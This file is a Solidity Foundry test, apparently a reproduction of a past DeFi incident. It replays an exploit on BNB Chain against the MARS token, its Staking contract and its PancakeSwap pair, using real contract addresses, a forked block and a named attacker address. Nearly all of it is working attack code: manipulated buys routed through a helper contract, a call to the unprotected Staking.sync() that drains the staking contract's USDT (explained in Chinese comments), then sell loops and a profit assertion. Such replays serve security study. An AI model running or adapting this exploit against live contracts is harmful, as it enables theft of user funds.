// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IUniswapV2Pair {
    function sync() external;
    function getReserves() external view returns (uint112, uint112, uint32);
}

interface IStaking {
    function sync() external;
}

// Local Helper contract to bypass cold restriction
contract LocalHelper {
    address public immutable owner;
    address constant ATTACKER = 0x2524b98F1bF4F030A4524C7e2dDCCf2F61c5b9D4;
    address constant PANCAKE_ROUTER =
        0x10ED43C718714eb63d5aA57B78B54704E256024E;

    constructor() {
        owner = msg.sender;
    }

    // Function selector: 0x7f017f5d (similar to original helper)
    event RecycleLog(address token, uint256 balance);

    function recycle(address token) external {
        // In real attack, this checks tx.origin == ATTACKER
        // For test, we just allow the owner
        //require(msg.sender == owner, "Not owner");

        uint256 bal = IERC20(token).balanceOf(address(this));
        emit RecycleLog(token, bal); // Print bal
        IERC20(token).transfer(msg.sender, bal);
    }

    // Approve router to spend tokens
    function approveRouter(address token) external {
        IERC20(token).approve(PANCAKE_ROUTER, type(uint256).max);
    }

    // Sell MARS from helper
    function sellMars(address mars, address usdt, uint256 amount) external {
        require(msg.sender == owner, "Not owner");

        address[] memory path = new address[](2);
        path[0] = mars;
        path[1] = usdt;

        IPancakeRouter(PANCAKE_ROUTER)
            .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                amount,
                1,
                path,
                owner, // Send USDT back to owner (main contract)
                block.timestamp + 3600
            );
    }
}

contract TxSimulation is Test {
    uint256 constant FORK_BLOCK = 71845320;

    IERC20 constant MARS = IERC20(0xA8b9c16E2A95d045254996281C7496112e80192E);
    IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IStaking constant STAKING =
        IStaking(0x550167A2C39F9d70A5DC98ABfA603bd4D1FAB12f);
    //Victim Contract
    IUniswapV2Pair constant PAIR =
        IUniswapV2Pair(0x1389928c3C00b5022804e1E62cf8963C71A22067);
    //PancakeSwap is a Uniswap V2 fork, therefore it reuses the same interface.
    IPancakeRouter constant ROUTER =
        IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    uint256 constant FLASHLOAN = 8000 * 1e18;
    uint256 constant LOOP1 = 15;
    uint256 constant LOOP2 = 7;

    LocalHelper public helper;

    function setUp() public {
        vm.createSelectFork(
            "https://virtual.binance.eu.rpc.tenderly.co/cfedb714-1fb9-4826-b781-538967dc7744",
            FORK_BLOCK
        );

        // Deploy local helper
        helper = new LocalHelper();
    }

    function _logReserves(string memory label) internal {
        (uint112 r0, uint112 r1, ) = PAIR.getReserves();
        emit log(label);
        emit log_named_uint("  Pair USDT reserve", uint256(r0) / 1e18);
        emit log_named_uint("  Pair MARS reserve", uint256(r1) / 1e18);
    }

    function testExploit() public {
        emit log("=== MARS Exploit PoC ===");
        emit log_named_address("Local Helper deployed at", address(helper));

        // Log initial state
        emit log_named_uint(
            "Initial Staking USDT",
            USDT.balanceOf(address(STAKING)) / 1e18
        );
        _logReserves("Initial Pair Reserves");

        // Step 1: Flashloan
        deal(address(USDT), address(this), FLASHLOAN);
        emit log("Step 1: Got 8000 USDT");

        // Step 2: Approve Router
        USDT.approve(address(ROUTER), type(uint256).max);
        MARS.approve(address(ROUTER), type(uint256).max);
        //helper.approveRouter(address(MARS));
        emit log("Step 2: Approved Router");

        // Step 3: Buy MARS (15 loops) - send to Helper!
        emit log("Step 3: Buying MARS (15 loops) -> sending to Helper...");
        address[] memory buyPath = new address[](2);
        buyPath[0] = address(USDT);
        buyPath[1] = address(MARS);

        uint256 perSwap = FLASHLOAN / LOOP1;
        for (uint256 i = 0; i < LOOP1; i++) {
            ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                perSwap,
                1,
                buyPath,
                address(helper), // <-- MARS goes to Helper!
                block.timestamp + 3600
            );
        }
        emit log_named_uint(
            "  Helper got MARS",
            MARS.balanceOf(address(helper)) / 1e18
        );

        // Step 4: Staking sync
        // ============================================================
        // STAKING.sync() 觸發 Staking 合約的再平衡機制：
        // 1. Staking 合約會讀取當前 MARS/USDT 價格
        // 2. 因為我們剛買入 MARS 推高了價格，Staking 認為需要再平衡
        // 3. Staking 會用它持有的 USDT 去高價購買 MARS
        // 4. 這導致 Staking 的 USDT 被「榨乾」(DRAINED)
        // 5. 攻擊者隨後可以賣出 MARS 獲利
        // ============================================================
        emit log("Step 4: Calling Staking.sync()");
        uint256 stakingBefore = USDT.balanceOf(address(STAKING));
        emit log_named_uint("  Staking USDT BEFORE", stakingBefore / 1e18);

        STAKING.sync();
        // sources\56_0x550167a2c39f9d70a5dc98abfa603bd4d1fab12f\Staking.sol
        /*
            @notice 同步流动性池
            @dev 将合约中的USDT转移到配对合约并同步价格
            
            function sync() external {
                uint256 w_bal = IERC20(USDT).balanceOf(address(this));
                address pair = MARS.uniswapV2Pair();
                IERC20(USDT).transfer(pair, w_bal);
                IUniswapV2Pair(pair).sync();
            }
        */
        uint256 stakingAfter = USDT.balanceOf(address(STAKING));
        emit log_named_uint("  Staking USDT AFTER", stakingAfter / 1e18);
        emit log_named_uint(
            "  USDT DRAINED",
            (stakingBefore - stakingAfter) / 1e18
        );
        //_logReserves("After Staking.sync()");

        // Step 5: helper recycles MARS
        emit log("Step 6: Helper recycling MARS...");
        helper.recycle(address(MARS));
        emit log_named_uint(
            "  Helper MARS after recycle",
            MARS.balanceOf(address(helper)) / 1e18
        );
        emit log_named_uint(
            "  This contract MARS after recycle",
            MARS.balanceOf(address(this)) / 1e18
        );
        //_logReserves("After Helper.recycle()");

        // Step 6: Sell MARS (7 loops) - using MARS balance from Staking / 11
        emit log("Step 6: Selling MARS (7 loops)...");

        uint256 myMarsBefore = MARS.balanceOf(address(this));
        uint256 myUsdtBefore = USDT.balanceOf(address(this));
        emit log_named_uint("  This contract MARS BEFORE", myMarsBefore / 1e18);
        emit log_named_uint("  This contract USDT BEFORE", myUsdtBefore / 1e18);

        address[] memory pathSell = new address[](2);
        pathSell[0] = address(MARS);
        pathSell[1] = address(USDT);

        uint256 CHUNK_DIVISOR = 11; // Same as original attack

        for (uint256 i = 0; i < LOOP2; i++) {
            // Calculate amount based on MARS balance in PAIR / 11
            uint256 amountIn = MARS.balanceOf(address(PAIR)) / CHUNK_DIVISOR;

            try
                ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                    amountIn,
                    1,
                    pathSell,
                    address(this),
                    block.timestamp + 3600
                )
            {
                // success
                emit log_named_uint("  Sell iteration", i);
                _logReserves("  After sell");
            } catch {
                emit log("  Swap failed");
            }
        }

        uint256 myMarsAfter = MARS.balanceOf(address(this));
        uint256 myUsdtAfter = USDT.balanceOf(address(this));
        emit log_named_uint("  This contract MARS AFTER", myMarsAfter / 1e18);
        emit log_named_uint("  This contract USDT AFTER", myUsdtAfter / 1e18);

        _logReserves("After Sell");

        // Final state
        uint256 finalUsdt = USDT.balanceOf(address(this));
        uint256 finalMars = MARS.balanceOf(address(helper));

        emit log("=== Final State ===");
        emit log_named_uint("Final USDT", finalUsdt / 1e18);
        emit log_named_uint("Helper remaining MARS", finalMars / 1e18);

        if (finalUsdt >= FLASHLOAN) {
            uint256 profit = finalUsdt - FLASHLOAN;
            uint256 intPart = profit / 1e18;
            uint256 decPart = (profit % 1e18) / 1e16;

            string memory decStr = vm.toString(decPart);
            if (decPart < 10) {
                decStr = string.concat("0", decStr);
            }
            emit log_named_string(
                "PROFIT (USDT)",
                string.concat(vm.toString(intPart), ".", decStr)
            );
        } else {
            emit log_named_uint("LOSS (USDT)", (FLASHLOAN - finalUsdt) / 1e18);
            emit log("NOTE: MARS token transfer restriction still applies");
        }
        assertTrue(finalUsdt >= FLASHLOAN, "Exploit should be profitable");
    }
}
